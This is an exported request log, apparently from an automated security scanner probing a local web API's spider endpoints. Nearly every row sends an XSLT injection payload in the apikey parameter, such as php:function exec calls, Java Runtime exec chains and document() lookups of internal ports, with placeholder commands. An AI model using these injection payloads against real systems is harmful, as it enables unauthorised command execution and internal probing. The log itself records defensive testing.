ID,Request Tijdstempel,Response Tijdstempel,Methode,URL,Code,Reden,RTT,Grootte Resp. Header,Grootte Resp. Body
516378,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/spider/view/optionParseDsStore/override?apikey=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,200,OK,1,565,1020
516379,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/spider/view/optionParseSVNEntries/override?apikey=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,0,565,1029
516380,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/spider/view/optionParseGit/override?apikey=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,200,OK,1,565,1008
516381,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/spider/view/optionParseRobotsTxt/override?apikey=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,0,565,1026
516382,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/spider/view/optionParseSVNEntries/override?apikey=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,1,565,1029
516383,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/spider/view/optionParseRobotsTxt/override?apikey=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,2,565,1026
516384,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/spider/view/optionParseSitemapXml/override?apikey=%3C,200,OK,0,565,1029
516385,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/spider/view/optionParseSVNEntries/override?apikey=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,0,565,1029
516386,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/spider/view/optionParseRobotsTxt/override?apikey=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Flocalhost%3A22%27%29%22%2F%3E,200,OK,1,565,1025
516387,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/spider/view/optionParseSitemapXml/override?apikey=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,1,565,1029
516388,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/spider/view/optionParseRobotsTxt/override?apikey=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,200,OK,1,565,1026
516389,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/spider/view/optionParseSVNEntries/override?apikey=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,1,565,1029
516390,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/spider/view/optionPostForm/override?apikey=%3C,200,OK,1,565,1008
516391,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/spider/view/optionParseSitemapXml/override?apikey=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,1,565,1029
516392,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/spider/view/optionParseSVNEntries/override?apikey=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Flocalhost%3A22%27%29%22%2F%3E,200,OK,1,565,1029
516393,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/spider/view/optionParseRobotsTxt/override?apikey=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,200,OK,0,565,1026
516394,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/spider/view/optionPostForm/override?apikey=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,1,565,1008
516395,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/spider/view/optionParseSVNEntries/override?apikey=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,200,OK,1,565,1029
516396,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/spider/view/optionParseSitemapXml/override?apikey=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,1,565,1029
516397,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/spider/view/optionParseSVNEntries/override?apikey=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,200,OK,1,565,1029
516398,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/spider/view/optionPostForm/override?apikey=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,1,565,1008
516399,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/spider/view/optionPostForm/override?apikey=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,1,565,1008
516400,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/spider/view/optionParseSitemapXml/override?apikey=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,1,565,1029
516401,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/spider/view/optionProcessForm/override?apikey=%3C,200,OK,1,565,1017
516402,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/spider/view/optionParseSitemapXml/override?apikey=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Flocalhost%3A22%27%29%22%2F%3E,200,OK,0,565,1029
516403,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/spider/view/optionSendRefererHeader/override?apikey=%3C,200,OK,0,565,1117
516404,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/spider/view/optionPostForm/override?apikey=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,0,565,1007
516405,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/spider/view/optionParseSitemapXml/override?apikey=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,200,OK,1,565,1029
516406,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/spider/view/optionProcessForm/override?apikey=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,0,565,1017
516407,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/spider/view/optionPostForm/override?apikey=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Flocalhost%3A22%27%29%22%2F%3E,200,OK,1,565,1008
516408,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/spider/view/optionParseSitemapXml/override?apikey=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,200,OK,0,565,1029
516409,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/spider/view/optionSendRefererHeader/override?apikey=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,1,565,1117
516410,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/spider/view/optionPostForm/override?apikey=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,200,OK,1,565,1008
516411,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/spider/view/optionProcessForm/override?apikey=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,1,565,1017
516412,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/spider/view/optionShowAdvancedDialog/override?apikey=%3C,200,OK,1,565,1038
516413,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/spider/view/optionProcessForm/override?apikey=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,0,565,1017
516414,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/spider/view/optionShowAdvancedDialog/override?apikey=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,1,565,1038
516415,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/spider/view/optionPostForm/override?apikey=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,200,OK,1,565,1008
516416,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/spider/view/optionSendRefererHeader/override?apikey=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,0,565,1117
516417,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/spider/view/optionProcessForm/override?apikey=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,1,565,1017
516418,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/spider/view/optionSendRefererHeader/override?apikey=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,1,565,1117
516419,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/spider/view/optionShowAdvancedDialog/override?apikey=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,0,565,1038
516420,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/spider/view/optionProcessForm/override?apikey=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Flocalhost%3A22%27%29%22%2F%3E,200,OK,0,565,1017
516421,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/spider/view/optionSendRefererHeader/override?apikey=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,2,565,1117
516422,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/spider/view/optionShowAdvancedDialog/override?apikey=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,0,565,1038
516423,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/spider/view/optionSkipURLString/override?apikey=%3C,200,OK,0,565,1023
516424,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/spider/view/optionSendRefererHeader/override?apikey=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Flocalhost%3A22%27%29%22%2F%3E,200,OK,0,565,1117
516425,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/spider/view/optionProcessForm/override?apikey=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,200,OK,0,565,1017
516426,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/spider/view/optionSkipURLString/override?apikey=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,1,565,1022
516427,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/spider/view/optionShowAdvancedDialog/override?apikey=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,1,565,1038
516428,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/spider/view/optionThreadCount/override?apikey=%3C,200,OK,1,565,1017
516429,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/spider/view/optionProcessForm/override?apikey=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,200,OK,1,565,1017
516430,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/spider/view/optionSendRefererHeader/override?apikey=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,200,OK,0,565,1117
516431,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/spider/view/optionShowAdvancedDialog/override?apikey=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Flocalhost%3A22%27%29%22%2F%3E,200,OK,2,565,1038
516432,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/spider/view/optionSkipURLString/override?apikey=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,0,565,1022
516433,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/spider/view/optionSendRefererHeader/override?apikey=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,200,OK,0,565,1117
516434,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/spider/view/optionShowAdvancedDialog/override?apikey=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,200,OK,1,565,1038
516435,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/spider/view/optionThreadCount/override?apikey=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,1,565,1017
516436,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/spider/view/optionSkipURLString/override?apikey=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,2,565,1023
516437,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/spider/view/optionThreadCount/override?apikey=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,1,565,1015
516438,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/spider/view/optionShowAdvancedDialog/override?apikey=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,200,OK,1,565,1038
516439,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/spider/view/optionSkipURLString/override?apikey=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,0,565,1023
516440,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/spider/view/optionThreadCount/override?apikey=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,2,565,1017
516441,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/spider/view/optionSkipURLString/override?apikey=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Flocalhost%3A22%27%29%22%2F%3E,200,OK,1,565,1023
516442,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/spider/view/optionUserAgent/override?apikey=%3C,200,OK,1,565,1011
516443,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/spider/view/optionSkipURLString/override?apikey=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,200,OK,0,565,1023
516444,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/spider/view/optionThreadCount/override?apikey=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,0,565,1017
516445,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/spider/view/optionUserAgent/override?apikey=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,2,565,1011
516446,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/spider/view/override?apikey=%3C&scanId=ZAP,400,Bad Request,1,572,12
516447,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/spider/view/override?apikey=%3C,400,Bad Request,1,572,12
516448,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/spider/view/optionUserAgent/override?apikey=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,1,565,1011
516449,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/spider/view/optionThreadCount/override?apikey=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Flocalhost%3A22%27%29%22%2F%3E,200,OK,0,565,1017
516450,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/spider/view/optionSkipURLString/override?apikey=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,200,OK,1,565,1023
516451,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/spider/view/optionUserAgent/override?apikey=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,1,565,1011
516452,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/spider/view/override?apikey=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E&scanId=ZAP,400,Bad Request,0,572,12
516453,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/spider/view/results/override?apikey=%3C&scanId=ZAP,200,OK,0,565,1064
516454,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/spider/view/optionThreadCount/override?apikey=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,200,OK,1,565,1017
516455,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/spider/view/optionUserAgent/override?apikey=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,0,565,1011
516456,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/spider/view/override?apikey=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,400,Bad Request,1,572,12
516457,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/spider/view/optionThreadCount/override?apikey=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,200,OK,1,565,1017
516458,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/spider/view/override?apikey=system-property%28%27xsl%3Avendor%27%29%2F%3E&scanId=ZAP,400,Bad Request,2,572,12
516459,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/spider/view/results/override?apikey=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E&scanId=ZAP,200,OK,2,565,1064
516460,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/spider/view/optionUserAgent/override?apikey=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Flocalhost%3A22%27%29%22%2F%3E,200,OK,1,565,1011
516461,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/spider/view/results/override?apikey=system-property%28%27xsl%3Avendor%27%29%2F%3E&scanId=ZAP,200,OK,0,565,1064
516462,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/spider/view/override?apikey=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&scanId=ZAP,400,Bad Request,0,572,12
516463,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/spider/view/override?apikey=system-property%28%27xsl%3Avendor%27%29%2F%3E,400,Bad Request,1,572,12
516464,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/spider/view/scans/override?apikey=%3C,200,OK,0,564,981
516465,Fri May 09 17:28:29 CEST 2025,Fri May 09 17:28:29 CEST 2025,GET,https://localhost:8080/UI/spider/view/results/override?apikey=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&scanId=ZAP,200,OK,0,565,1064
